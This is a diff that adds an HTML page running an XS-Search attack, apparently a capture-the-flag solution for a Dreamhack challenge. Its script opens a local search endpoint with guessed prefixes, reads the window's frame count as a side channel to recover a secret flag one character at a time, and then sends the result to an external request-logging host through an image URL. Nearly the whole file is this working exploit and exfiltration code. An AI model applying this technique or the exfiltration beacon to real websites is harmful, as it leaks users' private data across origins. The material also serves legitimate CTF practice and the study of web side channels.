@@ -1,0 +1,82 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>XS-Search FLAG</title>
+</head>
+
+<body>
+    <h1>XS-Search</h1>
+    <pre id="log"></pre>
+
+    <script>
+        const charset = "0123456789abcdef";
+        let prefix = "DH{";
+        const logEl = document.getElementById("log");
+
+        function log(msg) {
+            logEl.textContent += msg + "\n";
+            console.log(msg);
+        }
+
+        function testCandidate(candidate) {
+            return new Promise((resolve) => {
+                const url = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(candidate);
+
+                const w = window.open(url, "xssearch_window");
+
+                setTimeout(() => {
+                    let found = false;
+                    try {
+                        found = (w.length > 0);
+                    } catch (e) {
+                        found = false;
+                    }
+                    try {
+                        w.close();
+                    } catch (e) { }
+
+                    resolve(found);
+                }, 500);
+            });
+        }
+
+        (async () => {
+            const baseOk = await testCandidate(prefix);
+            log("Test 'DH{' => " + baseOk);
+
+            for (let i = 0; i < 32; i++) {
+            let foundChar = false;
+
+            for (const c of charset) {
+                const candidate = prefix + c;
+                log("Try (" + i + "): " + candidate);
+
+                const ok = await testCandidate(candidate);
+                if (ok) {
+                prefix = candidate;
+                log("Extended prefix: " + prefix);
+                foundChar = true;
+                break;
+                }
+            }
+
+            // 이 자리에 맞는 문자를 못 찾았다면 뭔가 이상한 상황
+            if (!foundChar) {
+                log("No matching char at position " + i + ", stop");
+                break;
+            }
+            }
+
+            log("END. Maybe FLAG : " + prefix);
+
+            const img = new Image();
+            img.src = "https://arrbrgu.request.dreamhack.games/log?flag=" + encodeURIComponent(prefix);
+
+            log("END. Maybe FLAG: " + prefix);
+        })();
+    </script>
+</body>
+
+</html>
